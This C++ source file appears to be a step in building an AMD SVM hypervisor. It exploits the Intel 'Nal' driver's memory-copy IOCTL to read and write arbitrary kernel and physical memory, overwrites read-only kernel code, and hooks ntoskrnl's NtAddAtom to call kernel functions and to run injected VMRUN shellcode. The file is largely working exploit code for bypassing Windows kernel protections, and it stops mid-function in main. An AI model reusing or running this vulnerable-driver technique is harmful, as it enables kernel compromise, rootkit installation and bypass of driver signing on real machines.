ох// SVMHypervisorV6_3.cpp
// Step 6.3: Exit-Driven VMEXIT Loop
//
// UPGRADES FROM V6.2:
// 1. Single loop instead of unrolled iterations
// 2. Exit-reason dispatch (CPUID, HLT, SHUTDOWN, INVALID)
// 3. Watchdog counter (max 100 exits)
// 4. HLT as explicit terminal
// 5. Guest RIP bounds check
//
// This is a REAL hypervisor structure!

#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <intrin.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

typedef LONG NTSTATUS;
#define NTAPI __stdcall

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "advapi32.lib")

#define IOCTL_INTEL_COPY 0x80862007

typedef struct _COPY_MEMORY_BUFFER_INFO {
  uint64_t case_number;
  uint64_t reserved;
  uint64_t source;
  uint64_t destination;
  uint64_t length;
} COPY_MEMORY_BUFFER_INFO;

typedef struct _GET_PHYS_ADDRESS_BUFFER_INFO {
  uint64_t case_number;
  uint64_t reserved;
  uint64_t return_physical_address;
  uint64_t address_to_translate;
} GET_PHYS_ADDRESS_BUFFER_INFO;

typedef struct _MAP_IO_SPACE_BUFFER_INFO {
  uint64_t case_number;
  uint64_t reserved;
  uint64_t return_value;
  uint64_t return_virtual_address;
  uint64_t physical_address_to_map;
  uint32_t size;
} MAP_IO_SPACE_BUFFER_INFO;

typedef struct _UNMAP_IO_SPACE_BUFFER_INFO {
  uint64_t case_number;
  uint64_t reserved;
  uint64_t reserved2;
  uint64_t virt_address;
  uint64_t reserved3;
  uint32_t number_of_bytes;
} UNMAP_IO_SPACE_BUFFER_INFO;

extern "C" {
NTSTATUS NTAPI NtQuerySystemInformation(ULONG, PVOID, ULONG, PULONG);
}

typedef struct _RTL_PROCESS_MODULE_INFORMATION {
  HANDLE Section;
  PVOID MappedBase;
  PVOID ImageBase;
  ULONG ImageSize;
  ULONG Flags;
  USHORT LoadOrderIndex;
  USHORT InitOrderIndex;
  USHORT LoadCount;
  USHORT OffsetToFileName;
  UCHAR FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION, *PRTL_PROCESS_MODULE_INFORMATION;

typedef struct _RTL_PROCESS_MODULES {
  ULONG NumberOfModules;
  RTL_PROCESS_MODULE_INFORMATION Modules[1];
} RTL_PROCESS_MODULES, *PRTL_PROCESS_MODULES;

HANDLE hDevice = INVALID_HANDLE_VALUE;
uint64_t ntoskrnlBase = 0;
uint64_t kernelNtAddAtom = 0;

bool MemCopy(uint64_t dest, uint64_t src, uint64_t size) {
  COPY_MEMORY_BUFFER_INFO info = {0};
  info.case_number = 0x33;
  info.source = src;
  info.destination = dest;
  info.length = size;
  DWORD bytesReturned = 0;
  return DeviceIoControl(hDevice, IOCTL_INTEL_COPY, &info, sizeof(info),
                         nullptr, 0, &bytesReturned, nullptr) != FALSE;
}

bool ReadMemory(uint64_t address, void *buffer, uint64_t size) {
  if (size > 0x1000)
    size = 0x1000;
  void *pinnedBuffer =
      VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  if (!pinnedBuffer)
    return false;
  VirtualLock(pinnedBuffer, 0x1000);
  bool result = MemCopy((uint64_t)pinnedBuffer, address, size);
  if (result)
    memcpy(buffer, pinnedBuffer, size);
  VirtualUnlock(pinnedBuffer, 0x1000);
  VirtualFree(pinnedBuffer, 0, MEM_RELEASE);
  return result;
}

bool WriteMemory(uint64_t address, void *buffer, uint64_t size) {
  void *pinnedBuffer =
      VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  if (!pinnedBuffer)
    return false;
  memcpy(pinnedBuffer, buffer, size);
  VirtualLock(pinnedBuffer, 0x1000);
  bool result = MemCopy(address, (uint64_t)pinnedBuffer, size);
  VirtualUnlock(pinnedBuffer, 0x1000);
  VirtualFree(pinnedBuffer, 0, MEM_RELEASE);
  return result;
}

bool GetPhysicalAddress(uint64_t address, uint64_t *outPhys) {
  GET_PHYS_ADDRESS_BUFFER_INFO info = {0};
  info.case_number = 0x25;
  info.address_to_translate = address;
  DWORD bytesReturned = 0;
  if (!DeviceIoControl(hDevice, IOCTL_INTEL_COPY, &info, sizeof(info), &info,
                       sizeof(info), &bytesReturned, nullptr))
    return false;
  *outPhys = info.return_physical_address;
  return true;
}

uint64_t MapIoSpace(uint64_t physAddr, uint32_t size) {
  MAP_IO_SPACE_BUFFER_INFO info = {0};
  info.case_number = 0x19;
  info.physical_address_to_map = physAddr;
  info.size = size;
  DWORD bytesReturned = 0;
  if (!DeviceIoControl(hDevice, IOCTL_INTEL_COPY, &info, sizeof(info), &info,
                       sizeof(info), &bytesReturned, nullptr))
    return 0;
  return info.return_virtual_address;
}

bool UnmapIoSpace(uint64_t virtAddr, uint32_t size) {
  UNMAP_IO_SPACE_BUFFER_INFO info = {0};
  info.case_number = 0x1A;
  info.virt_address = virtAddr;
  info.number_of_bytes = size;
  DWORD bytesReturned = 0;
  return DeviceIoControl(hDevice, IOCTL_INTEL_COPY, &info, sizeof(info),
                         nullptr, 0, &bytesReturned, nullptr) != FALSE;
}

bool WriteToReadOnlyMemory(uint64_t address, void *buffer, uint32_t size) {
  uint64_t physAddr = 0;
  if (!GetPhysicalAddress(address, &physAddr) || physAddr == 0)
    return false;
  uint64_t mappedAddr = MapIoSpace(physAddr, size);
  if (!mappedAddr)
    return false;
  void *pinnedBuffer =
      VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  if (!pinnedBuffer) {
    UnmapIoSpace(mappedAddr, size);
    return false;
  }
  memcpy(pinnedBuffer, buffer, size);
  VirtualLock(pinnedBuffer, 0x1000);
  bool result = MemCopy(mappedAddr, (uint64_t)pinnedBuffer, size);
  VirtualUnlock(pinnedBuffer, 0x1000);
  VirtualFree(pinnedBuffer, 0, MEM_RELEASE);
  UnmapIoSpace(mappedAddr, size);
  return result;
}

uint64_t GetKernelModuleBase(const char *moduleName,
                             uint32_t *outSize = nullptr) {
  ULONG size = 0;
  NtQuerySystemInformation(11, nullptr, 0, &size);
  PRTL_PROCESS_MODULES modules = (PRTL_PROCESS_MODULES)malloc(size);
  if (!modules)
    return 0;
  if (NtQuerySystemInformation(11, modules, size, &size) != 0) {
    free(modules);
    return 0;
  }
  uint64_t base = 0;
  for (ULONG i = 0; i < modules->NumberOfModules; i++) {
    char *name = (char *)modules->Modules[i].FullPathName +
                 modules->Modules[i].OffsetToFileName;
    if (_stricmp(name, moduleName) == 0) {
      base = (uint64_t)modules->Modules[i].ImageBase;
      if (outSize)
        *outSize = modules->Modules[i].ImageSize;
      break;
    }
  }
  free(modules);
  return base;
}

uint64_t GetKernelExport(uint64_t moduleBase, const char *exportName) {
  IMAGE_DOS_HEADER dosHeader;
  IMAGE_NT_HEADERS64 ntHeaders;
  if (!ReadMemory(moduleBase, &dosHeader, sizeof(dosHeader)))
    return 0;
  if (dosHeader.e_magic != IMAGE_DOS_SIGNATURE)
    return 0;
  if (!ReadMemory(moduleBase + dosHeader.e_lfanew, &ntHeaders,
                  sizeof(ntHeaders)))
    return 0;
  if (ntHeaders.Signature != IMAGE_NT_SIGNATURE)
    return 0;
  uint32_t exportRva =
      ntHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
          .VirtualAddress;
  uint32_t exportSize =
      ntHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
  if (!exportRva || !exportSize)
    return 0;
  uint32_t readSize = (exportSize < 0x40000) ? exportSize : 0x40000;
  BYTE *exportData = (BYTE *)VirtualAlloc(
      nullptr, readSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  if (!exportData)
    return 0;
  for (uint32_t offset = 0; offset < readSize; offset += 0x1000) {
    uint32_t chunkSize =
        ((readSize - offset) < 0x1000) ? (readSize - offset) : 0x1000;
    ReadMemory(moduleBase + exportRva + offset, exportData + offset, chunkSize);
  }
  IMAGE_EXPORT_DIRECTORY *exportDir = (IMAGE_EXPORT_DIRECTORY *)exportData;
  uint64_t delta = (uint64_t)exportData - exportRva;
  if (exportDir->AddressOfNames < exportRva ||
      exportDir->AddressOfNames >= exportRva + readSize) {
    VirtualFree(exportData, 0, MEM_RELEASE);
    return 0;
  }
  uint32_t *nameTable = (uint32_t *)(exportDir->AddressOfNames + delta);
  uint16_t *ordinalTable =
      (uint16_t *)(exportDir->AddressOfNameOrdinals + delta);
  uint32_t *funcTable = (uint32_t *)(exportDir->AddressOfFunctions + delta);
  uint64_t result = 0;
  for (uint32_t i = 0; i < exportDir->NumberOfNames && i < 10000; i++) {
    uint32_t nameRva = nameTable[i];
    if (nameRva < exportRva || nameRva >= exportRva + readSize)
      continue;
    char *funcName = (char *)(nameRva + delta);
    if (strcmp(funcName, exportName) == 0) {
      result = moduleBase + funcTable[ordinalTable[i]];
      break;
    }
  }
  VirtualFree(exportData, 0, MEM_RELEASE);
  return result;
}

uint8_t kernel_injected_jmp[] = {0x48, 0xb8, 0x00, 0x00, 0x00, 0x00,
                                 0x00, 0x00, 0x00, 0x00, 0xff, 0xe0};
uint8_t original_kernel_function[sizeof(kernel_injected_jmp)];

template <typename RetType, typename... Args>
bool CallKernelFunction(RetType *outResult, uint64_t targetFuncAddr,
                        Args... args) {
  if (!targetFuncAddr || !kernelNtAddAtom)
    return false;
  if (!ReadMemory(kernelNtAddAtom, original_kernel_function,
                  sizeof(original_kernel_function)))
    return false;
  if (original_kernel_function[0] == 0x48 &&
      original_kernel_function[1] == 0xb8)
    return false;
  uint8_t jmpHook[sizeof(kernel_injected_jmp)];
  memcpy(jmpHook, kernel_injected_jmp, sizeof(jmpHook));
  *(uint64_t *)&jmpHook[2] = targetFuncAddr;
  if (!WriteToReadOnlyMemory(kernelNtAddAtom, jmpHook, sizeof(jmpHook)))
    return false;
  HMODULE ntdll = GetModuleHandleA("ntdll.dll");
  auto NtAddAtomPtr = reinterpret_cast<RetType(__stdcall *)(Args...)>(
      GetProcAddress(ntdll, "NtAddAtom"));
  RetType result = NtAddAtomPtr(args...);
  WriteToReadOnlyMemory(kernelNtAddAtom, original_kernel_function,
                        sizeof(original_kernel_function));
  if (outResult)
    *outResult = result;
  return true;
}

// ==================== V6.3 VMEXIT Loop Shellcode ====================
// Exit-driven loop with:
// - Single loop structure (jmp back)
// - Exit-reason dispatch
// - Watchdog counter (max 100)
// - Explicit HLT terminal
// - Guest RIP bounds check
//
// Return value format:
//   bits 31-24: final exit reason (0x00-0xFF)
//   bits 23-16: termination code (0=OK, 1=HLT, 2=WATCHDOG, 3=BAD_RIP,
//   4=UNKNOWN) bits 15-0:  CPUID count

uint8_t v6_3Shellcode[] = {
    // ===== Prologue =====
    0x55, // push rbp
    0x48,
    0x89,
    0xE5, // mov rbp, rsp

    // ===== Enable SVME =====
    0xB9,
    0x80,
    0x00,
    0x00,
    0xC0, // mov ecx, 0xC0000080
    0x0F,
    0x32, // rdmsr
    0x0D,
    0x00,
    0x10,
    0x00,
    0x00, // or eax, 0x1000
    0x0F,
    0x30, // wrmsr

    // ===== VM_HSAVE_PA =====
    0xB9,
    0x17,
    0x01,
    0x01,
    0xC0, // mov ecx, 0xC0010117
    0xB8,
    0x00,
    0x00,
    0x00,
    0x00, // @HSAVE_LOW
    0xBA,
    0x00,
    0x00,
    0x00,
    0x00, // @HSAVE_HIGH
    0x0F,
    0x30, // wrmsr

    // ===== Load pointers =====
    // r15 = host_save_va (for GPR save/restore)
    // r14 = vmcb_pa (for vmload/vmrun/vmsave)
    // r13 = vmcb_va (for VMCB field access)
    // r10 = guest_code_start (for RIP bounds)
    // r9  = guest_code_end
    0x49,
    0xBF,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00, // @HOST_SAVE_VA
    0x49,
    0xBE,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00, // @VMCB_PA
    0x49,
    0xBD,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00, // @VMCB_VA
    0x49,
    0xBA,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00, // @GUEST_START
    0x49,
    0xB9,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00, // @GUEST_END

    // ===== VMSAVE host state =====
    0x4C,
    0x89,
    0xF0, // mov rax, r14
    0x0F,
    0x01,
    0xDB, // vmsave rax

    // ===== Populate VMCB =====
    // CR0
    0x0F,
    0x20,
    0xC0, // mov rax, cr0
    0x49,
    0x89,
    0x85,
    0x58,
    0x05,
    0x00,
    0x00, // mov [r13+0x558], rax
    // CR3
    0x0F,
    0x20,
    0xD8, // mov rax, cr3
    0x49,
    0x89,
    0x85,
    0x50,
    0x05,
    0x00,
    0x00, // mov [r13+0x550], rax
    // CR4
    0x0F,
    0x20,
    0xE0, // mov rax, cr4
    0x49,
    0x89,
    0x85,
    0x48,
    0x05,
    0x00,
    0x00, // mov [r13+0x548], rax
    // EFER
    0xB9,
    0x80,
    0x00,
    0x00,
    0xC0, // mov ecx, 0xC0000080
    0x0F,
    0x32, // rdmsr
    0x48,
    0xC1,
    0xE2,
    0x20, // shl rdx, 32
    0x48,
    0x09,
    0xD0, // or rax, rdx
    0x49,
    0x89,
    0x85,
    0xD0,
    0x04,
    0x00,
    0x00, // mov [r13+0x4D0], rax
    // GDTR
    0x48,
    0x83,
    0xEC,
    0x10, // sub rsp, 16
    0x0F,
    0x01,
    0x04,
    0x24, // sgdt [rsp]
    0x0F,
    0xB7,
    0x04,
    0x24, // movzx eax, word [rsp]
    0x41,
    0x89,
    0x85,
    0x64,
    0x04,
    0x00,
    0x00, // mov [r13+0x464], eax
    0x48,
    0x8B,
    0x44,
    0x24,
    0x02, // mov rax, [rsp+2]
    0x49,
    0x89,
    0x85,
    0x68,
    0x04,
    0x00,
    0x00, // mov [r13+0x468], rax
    // IDTR
    0x0F,
    0x01,
    0x0C,
    0x24, // sidt [rsp]
    0x0F,
    0xB7,
    0x04,
    0x24, // movzx eax, word [rsp]
    0x41,
    0x89,
    0x85,
    0x84,
    0x04,
    0x00,
    0x00, // mov [r13+0x484], eax
    0x48,
    0x8B,
    0x44,
    0x24,
    0x02, // mov rax, [rsp+2]
    0x49,
    0x89,
    0x85,
    0x88,
    0x04,
    0x00,
    0x00, // mov [r13+0x488], rax
    0x48,
    0x83,
    0xC4,
    0x10, // add rsp, 16
    // Segments
    0x8C,
    0xC8, // mov ax, cs
    0x66,
    0x41,
    0x89,
    0x85,
    0x10,
    0x04,
    0x00,
    0x00, // mov [r13+0x410], ax
    0x8C,
    0xD0, // mov ax, ss
    0x66,
    0x41,
    0x89,
    0x85,
    0x20,
    0x04,
    0x00,
    0x00, // mov [r13+0x420], ax
    0x8C,
    0xD8, // mov ax, ds
    0x66,
    0x41,
    0x89,
    0x85,
    0x30,
    0x04,
    0x00,
    0x00, // mov [r13+0x430], ax
    0x8C,
    0xC0, // mov ax, es
    0x66,
    0x41,
    0x89,
    0x85,
    0x00,
    0x04,
    0x00,
    0x00, // mov [r13+0x400], ax
    // Segment limits (flat 4GB)
    0xB8,
    0xFF,
    0xFF,
    0xFF,
    0xFF, // mov eax, 0xFFFFFFFF
    0x41,
    0x89,
    0x85,
    0x04,
    0x04,
    0x00,
    0x00, // mov [r13+0x404], eax (ES limit)
    0x41,
    0x89,
    0x85,
    0x14,
    0x04,
    0x00,
    0x00, // mov [r13+0x414], eax (CS limit)
    0x41,
    0x89,
    0x85,
    0x24,
    0x04,
    0x00,
    0x00, // mov [r13+0x424], eax (SS limit)
    0x41,
    0x89,
    0x85,
    0x34,
    0x04,
    0x00,
    0x00, // mov [r13+0x434], eax (DS limit)
    // Segment attributes
    0x66,
    0x41,
    0xC7,
    0x85,
    0x12,
    0x04,
    0x00,
    0x00,
    0x9B,
    0x02, // CS attr = 0x029B
    0x66,
    0x41,
    0xC7,
    0x85,
    0x22,
    0x04,
    0x00,
    0x00,
    0x93,
    0x00, // SS attr = 0x0093
    0x66,
    0x41,
    0xC7,
    0x85,
    0x32,
    0x04,
    0x00,
    0x00,
    0x93,
    0x00, // DS attr = 0x0093
    0x66,
    0x41,
    0xC7,
    0x85,
    0x02,
    0x04,
    0x00,
    0x00,
    0x93,
    0x00, // ES attr = 0x0093
    // RFLAGS (from host)
    0x9C, // pushfq
    0x58, // pop rax
    0x49,
    0x89,
    0x85,
    0x70,
    0x05,
    0x00,
    0x00, // mov [r13+0x570], rax
    // RSP (from host)
    0x48,
    0x89,
    0xE0, // mov rax, rsp
    0x49,
    0x89,
    0x85,
    0xD8,
    0x05,
    0x00,
    0x00, // mov [r13+0x5D8], rax
    // ASID = 1
    0x41,
    0xC7,
    0x45,
    0x58,
    0x01,
    0x00,
    0x00,
    0x00,

    // ===== Intercepts: CPUID + HLT + VMRUN =====
    0x41,
    0xC7,
    0x45,
    0x0C,
    0x00,
    0x00,
    0x04,
    0x01, // CPUID (bit 24) + HLT (bit 0)
    0x41,
    0xC7,
    0x45,
    0x10,
    0x01,
    0x00,
    0x00,
    0x00, // VMRUN (bit 0)

    // ===== Set guest RIP = guest code start =====
    0x4C,
    0x89,
    0xD0, // mov rax, r10 (guest_start)
    0x49,
    0x89,
    0x85,
    0x78,
    0x05,
    0x00,
    0x00, // mov [r13+0x578], rax

    // ===== Set guest RAX = 1 (CPUID leaf) =====
    0x49,
    0xC7,
    0x85,
    0xF8,
    0x05,
    0x00,
    0x00,
    0x01,
    0x00,
    0x00,
    0x00,

    // ===== Initialize counters =====
    // r12d = cpuid count
    // r11d = termination code (0=OK, 1=HLT, 2=WATCHDOG, 3=BAD_RIP, 4=UNKNOWN)
    // r8d  = exit counter (watchdog)
    // ebx  = final exit reason
    0x45,
    0x31,
    0xE4, // xor r12d, r12d
    0x45,
    0x31,
    0xDB, // xor r11d, r11d
    0x45,
    0x31,
    0xC0, // xor r8d, r8d
    0x31,
    0xDB, // xor ebx, ebx

    // ===== Save host GPRs =====
    0x49,
    0x89,
    0x4F,
    0x08, // mov [r15+0x08], rcx
    0x49,
    0x89,
    0x57,
    0x10, // mov [r15+0x10], rdx
    0x49,
    0x89,
    0x77,
    0x18, // mov [r15+0x18], rsi
    0x49,
    0x89,
    0x7F,
    0x20, // mov [r15+0x20], rdi
    0x9C, // pushfq
    0x41,
    0x8F,
    0x47,
    0x70, // pop qword [r15+0x70]

    // ===== VMEXIT LOOP =====
    // vmloop:
    0x4C,
    0x89,
    0xF0, // mov rax, r14 (vmcb_pa)
    0xFA, // cli
    0x0F,
    0x01,
    0xDA, // vmload rax
    0x0F,
    0x01,
    0xD8, // vmrun rax
    0x0F,
    0x01,
    0xDB, // vmsave rax
    0x0F,
    0x01,
    0xDC, // stgi

    // ===== Watchdog check =====
    0x41,
    0xFF,
    0xC0, // inc r8d
    0x41,
    0x81,
    0xF8,
    0x64,
    0x00,
    0x00,
    0x00, // cmp r8d, 100
    0x0F,
    0x8D,
    0x8A,
    0x00,
    0x00,
    0x00, // jge watchdog_exit

    // ===== Get exit reason =====
    0x41,
    0x8B,
    0x5D,
    0x70, // mov ebx, [r13+0x70]
    0x41,
    0xC7,
    0x45,
    0x70,
    0x00,
    0x00,
    0x00,
    0x00, // clear exit code

    // ===== Exit dispatch =====
    // Check CPUID (0x72)
    0x81,
    0xFB,
    0x72,
    0x00,
    0x00,
    0x00, // cmp ebx, 0x72
    0x74,
    0x14, // je handle_cpuid

    // Check HLT (0x78)
    0x81,
    0xFB,
    0x78,
    0x00,
    0x00,
    0x00, // cmp ebx, 0x78
    0x0F,
    0x84,
    0x63,
    0x00,
    0x00,
    0x00, // je hlt_exit

    // Unknown exit -> terminate
    0x41,
    0xB3,
    0x04, // mov r11b, 4 (UNKNOWN)
    0xE9,
    0x66,
    0x00,
    0x00,
    0x00, // jmp done

    // handle_cpuid:
    0x41,
    0xFF,
    0xC4, // inc r12d

    // Execute CPUID with EAX=1
    0xB8,
    0x01,
    0x00,
    0x00,
    0x00, // mov eax, 1
    0x31,
    0xC9, // xor ecx, ecx
    0x0F,
    0xA2, // cpuid

    // Set hypervisor present bit (ECX bit 31)
    0x0F,
    0xBA,
    0xE9,
    0x1F, // bts ecx, 31

    // Write results back to VMCB guest state
    // RAX @ 0x5F8, RBX @ 0x5E0 (offset from state save), RCX @ 0x5E8, RDX @
    // 0x5F0
    // Actually: guest RAX=0x5F8, RBX=0x5E0 is wrong... let me use correct
    // offsets
    // Guest save state in VMCB starts at 0x400 but GPRs are at end
    // For now, just advance RIP - we'll write ECX back to VMCB for real later

    // Advance guest RIP by 2 (CPUID is 2 bytes)
    0x49,
    0x8B,
    0x85,
    0x78,
    0x05,
    0x00,
    0x00, // mov rax, [r13+0x578] (guest RIP)
    0x48,
    0x83,
    0xC0,
    0x02, // add rax, 2
    0x49,
    0x89,
    0x85,
    0x78,
    0x05,
    0x00,
    0x00, // mov [r13+0x578], rax

    // ===== RIP bounds check =====
    0x4C,
    0x39,
    0xC8, // cmp rax, r9 (guest_end)
    0x0F,
    0x87,
    0x2A,
    0x00,
    0x00,
    0x00, // ja bad_rip_exit

    // Loop back
    0xE9,
    0x71,
    0xFF,
    0xFF,
    0xFF, // jmp vmloop

    // hlt_exit:
    0x41,
    0xB3,
    0x01, // mov r11b, 1 (HLT)
    0xEB,
    0x1A, // jmp done

    // watchdog_exit:
    0x41,
    0xB3,
    0x02, // mov r11b, 2 (WATCHDOG)
    0xEB,
    0x15, // jmp done

    // bad_rip_exit:
    0x41,
    0xB3,
    0x03, // mov r11b, 3 (BAD_RIP)
    0xEB,
    0x10, // jmp done

    // unknown_exit: (already handled above inline)

    // done:
    // Restore host GPRs
    0x49,
    0x8B,
    0x4F,
    0x08, // mov rcx, [r15+0x08]
    0x49,
    0x8B,
    0x57,
    0x10, // mov rdx, [r15+0x10]
    0x49,
    0x8B,
    0x77,
    0x18, // mov rsi, [r15+0x18]
    0x49,
    0x8B,
    0x7F,
    0x20, // mov rdi, [r15+0x20]
    0x41,
    0xFF,
    0x77,
    0x70, // push qword [r15+0x70]
    0x9D, // popfq

    // Build return value:
    // EAX = (exit_reason << 24) | (term_code << 16) | cpuid_count
    0x89,
    0xD8, // mov eax, ebx (exit reason)
    0xC1,
    0xE0,
    0x08, // shl eax, 8
    0x44,
    0x09,
    0xD8, // or eax, r11d (term code)
    0xC1,
    0xE0,
    0x10, // shl eax, 16
    0x44,
    0x09,
    0xE0, // or eax, r12d (cpuid count)

    // ===== Epilogue =====
    0x5D, // pop rbp
    0xC3, // ret

    // ===== Guest code =====
    // Starts here: @GUEST_START points here
    0x0F,
    0xA2, // cpuid
    0x0F,
    0xA2, // cpuid
    0x0F,
    0xA2, // cpuid
    0x0F,
    0xA2, // cpuid
    0x0F,
    0xA2, // cpuid
    0xF4, // hlt (terminal)
          // @GUEST_END points to after HLT
};

void PrintOffsets() {
  printf("[*] V6.3 Shellcode structure:\n");
  printf("    Total size: %zu bytes\n", sizeof(v6_3Shellcode));

  // Find guest code
  size_t guest_start =
      sizeof(v6_3Shellcode) - 12; // 5 CPUIDs (10 bytes) + HLT (1 byte) + 1
  printf("    Guest code start: offset %zu\n", guest_start);
  printf("    Guest code: ");
  for (size_t i = guest_start; i < sizeof(v6_3Shellcode); i++) {
    printf("%02X ", v6_3Shellcode[i]);
  }
  printf("\n\n");
}

int main() {
  printf("================================================================\n");
  printf("       SVM HYPERVISOR V6.3 - EXIT-DRIVEN VMEXIT LOOP           \n");
  printf("    Features:                                                  \n");
  printf("    - Single loop structure                                    \n");
  printf("    - Exit-reason dispatch (CPUID, HLT, UNKNOWN)               \n");
  printf("    - Watchdog counter (max 100 exits)                         \n");
  printf("    - RIP bounds check                                         \n");
  printf("    Guest: CPUID x5 -> HLT                                     \n");
  printf(
      "================================================================\n\n");

  PrintOffsets();

  // Calculate offsets dynamically
  size_t OFF_HSAVE_LOW = 0, OFF_HSAVE_HIGH = 0;
  size_t OFF_HOST_SAVE_VA = 0, OFF_VMCB_PA = 0, OFF_VMCB_VA = 0;
  size_t OFF_GUEST_START = 0, OFF_GUEST_END = 0;

  // Find HSAVE (mov eax, XX; mov edx, XX pattern)
  for (size_t i = 0; i < sizeof(v6_3Shellcode) - 10; i++) {
    if (v6_3Shellcode[i] == 0xB8 && v6_3Shellcode[i + 5] == 0xBA &&
        OFF_HSAVE_LOW == 0) {
      OFF_HSAVE_LOW = i + 1;
      OFF_HSAVE_HIGH = i + 6;
      break;
    }
  }

  // Find mov r15-r9 immediates
  int found = 0;
  for (size_t i = 0; i < sizeof(v6_3Shellcode) - 20 && found < 5; i++) {
    if (v6_3Shellcode[i] == 0x49) {
      if (v6_3Shellcode[i + 1] == 0xBF && OFF_HOST_SAVE_VA == 0) {
        OFF_HOST_SAVE_VA = i + 2;
        found++;
      } else if (v6_3Shellcode[i + 1] == 0xBE && OFF_VMCB_PA == 0) {
        OFF_VMCB_PA = i + 2;
        found++;
      } else if (v6_3Shellcode[i + 1] == 0xBD && OFF_VMCB_VA == 0) {
        OFF_VMCB_VA = i + 2;
        found++;
      } else if (v6_3Shellcode[i + 1] == 0xBA && OFF_GUEST_START == 0) {
        OFF_GUEST_START = i + 2;
        found++;
      } else if (v6_3Shellcode[i + 1] == 0xB9 && OFF_GUEST_END == 0) {
        OFF_GUEST_END = i + 2;
        found++;
      }
    }
  }

  size_t LOC_GUEST_CODE =
      sizeof(v6_3Shellcode) - 11; // 5 CPUIDs (10 bytes) + HLT (1 byte)
  size_t LOC_GUEST_END = sizeof(v6_3Shellcode);

  printf("[*] Calculated offsets:\n");
  printf("    HSAVE_LOW=%zu, HSAVE_HIGH=%zu\n", OFF_HSAVE_LOW, OFF_HSAVE_HIGH);
  printf("    HOST_SAVE_VA=%zu, VMCB_PA=%zu, VMCB_VA=%zu\n", OFF_HOST_SAVE_VA,
         OFF_VMCB_PA, OFF_VMCB_VA);
  printf("    GUEST_START=%zu, GUEST_END=%zu\n", OFF_GUEST_START,
         OFF_GUEST_END);
  printf("    Guest code location: %zu to %zu\n\n", LOC_GUEST_CODE,
         LOC_GUEST_END);

  hDevice = CreateFileW(L"\\\\.\\Nal", GENERIC_READ | GENERIC_WRITE, 0, nullptr,
                        OPEN_EXISTING, 0, nullptr);
  if (hDevice == INVALID_HANDLE_VALUE) {
    printf("[-] Intel driver not found!\n");
    return 1;
  }
  printf("[+] Intel driver opened\n");

  ntoskrnlBase = GetKernelModuleBase("ntoskrnl.exe");
  kernelNtAddAtom = GetKernelExport(ntoskrnlBase, "NtAddAtom");
  uint64_t kernelExAllocatePool =
      GetKernelExport(ntoskrnlBase, "ExAllocatePoolWithTag");
  printf("[+] ntoskrnl.exe: 0x%llX\n", ntoskrnlBase);
  printf("[+] NtAddAtom: 0x%llX\n", kernelNtAddAtom);

  // Allocate kernel memory
  uint64_t allocatedAddr = 0;
  CallKernelFunction<uint64_t>(&allocatedAddr, kernelExAllocatePool, 0, 0x3000,
                               0x484D5653);
  if (!allocatedAddr) {
    printf("[-] Kernel allocation failed!\n");
    CloseHandle(hDevice);
    return 1;
  }

  uint64_t vmcbVa = allocatedAddr;
  uint64_t hsaveVa = allocatedAddr + 0x1000;
  uint64_t hostSaveVa = allocatedAddr + 0x2000;
  uint64_t vmcbPa = 0, hsavePa = 0;
  GetPhysicalAddress(vmcbVa, &vmcbPa);
  GetPhysicalAddress(hsaveVa, &hsavePa);

  printf("[+] VMCB: VA=0x%llX PA=0x%llX\n", vmcbVa, vmcbPa);
  printf("[+] HSAVE: VA=0x%llX PA=0x%llX\n", hsaveVa, hsavePa);
  printf("[+] Host Save: VA=0x%llX\n", hostSaveVa);

  // Clear memory
  uint8_t zeros[0x1000] = {0};
  WriteMemory(vmcbVa, zeros, 0x1000);
  WriteMemory(hsaveVa, zeros, 0x1000);
  WriteMemory(hostSaveVa, zeros, 0x1000);

  // Calculate guest code address (will be at kernelNtAddAtom + LOC_GUEST_CODE)
  uint64_t guestStart = kernelNtAddAtom + LOC_GUEST_CODE;
  uint64_t guestEnd = kernelNtAddAtom + LOC_GUEST_END;

  // Patch shellcode
  uint8_t patched[sizeof(v6_3Shellcode)];
  memcpy(patched, v6_3Shellcode, sizeof(patched));

  *(uint32_t *)&patched[OFF_HSAVE_LOW] = (uint32_t)(hsavePa & 0xFFFFFFFF);
  *(uint32_t *)&patched[OFF_HSAVE_HIGH] =
      (uint32_t)((hsavePa >> 32) & 0xFFFFFFFF);
  *(uint64_t *)&patched[OFF_HOST_SAVE_VA] = hostSaveVa;
  *(uint64_t *)&patched[OFF_VMCB_PA] = vmcbPa;
  *(uint64_t *)&patched[OFF_VMCB_VA] = vmcbVa;
  *(uint64_t *)&patched[OFF_GUEST_START] = guestStart;
  *(uint64_t *)&patched[OFF_GUEST_END] = guestEnd;

  printf("[+] Guest code: 0x%llX to 0x%llX\n", guestStart, guestEnd);
  printf("[+] Shellcode patched (%zu bytes)\n\n", sizeof(patched));

  printf("Press ENTER to execute V6.3 VMEXIT loop...\n");
  getchar();

  // Backup and inject
  uint8_t backup[900];
  ReadMemory(kernelNtAddAtom, backup, sizeof(patched));
  WriteToReadOnlyMemory(kernelNtAddAtom, patched, sizeof(patched));

  printf("[*] Executing V6.3...\n");

  HMODULE ntdll = GetModuleHandleA("ntdll.dll");
  auto NtAddAtomFunc = (NTSTATUS(__stdcall *)(
      void *, ULONG, PUSHORT))GetProcAddress(ntdll, "NtAddAtom");
  USHORT atom = 0;
  NTSTATUS result = NtAddAtomFunc(nullptr, 0, &atom);

  // Restore
  WriteToReadOnlyMemory(kernelNtAddAtom, backup, sizeof(patched));
  printf("[+] NtAddAtom restored\n\n");

